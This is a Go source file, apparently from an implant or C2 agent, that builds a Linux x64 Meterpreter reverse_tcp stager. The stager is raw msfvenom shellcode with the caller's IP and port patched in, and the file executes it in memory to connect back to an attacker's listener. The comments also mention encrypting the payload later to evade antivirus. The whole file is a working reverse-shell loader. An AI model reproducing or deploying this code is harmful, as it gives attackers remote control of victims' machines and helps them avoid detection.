package meter

import (
	"encoding/binary"
	"math/big"
	"net"
	"strconv"

	"../shell"
)

// IP4toInt ...
func IP4toInt(IPv4Address net.IP) int64 {
	IPv4Int := big.NewInt(0)
	IPv4Int.SetBytes(IPv4Address.To4())
	return IPv4Int.Int64()
}

// Connect to meterpreter listener
func Connect(ip string, port string) (bool, error) {

	// for now we run the actual msfvenom generated stager because doing it dynamically fails for some unknown reason
	// we could encrypt this in the future to evade av or figure out the proper way to get the shellcode from the listener
	// generated via: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw
	portBytes := make([]byte, 2)
	portInt, _ := strconv.Atoi(port)
	binary.BigEndian.PutUint16(portBytes, uint16(portInt))
	ipBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(ipBytes, uint32(IP4toInt(net.ParseIP(ip))))

	stage1 := "\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9\x6a"
	stage1 += "\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a\x41\x59"
	stage1 += "\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x85\xc0"
	stage1 += "\x78\x3b\x48\x97\x48\xb9\x02\x00"
	stage1 += string(portBytes) //"\x11\x5c" 4444
	stage1 += string(ipBytes)   //"\x7f\x00\x00\x01" 127.0.0.1
	stage1 += "\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25"
	stage1 += "\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7"
	stage1 += "\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58"
	stage1 += "\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0\x78\xed"
	stage1 += "\xff\xe6"
	sc := []byte(stage1)

	//fmt.Printf("%02X", portBytes)
	//fmt.Printf("%02X", ipBytes)

	go shell.ExecSC([]byte(sc))
	return true, nil
}
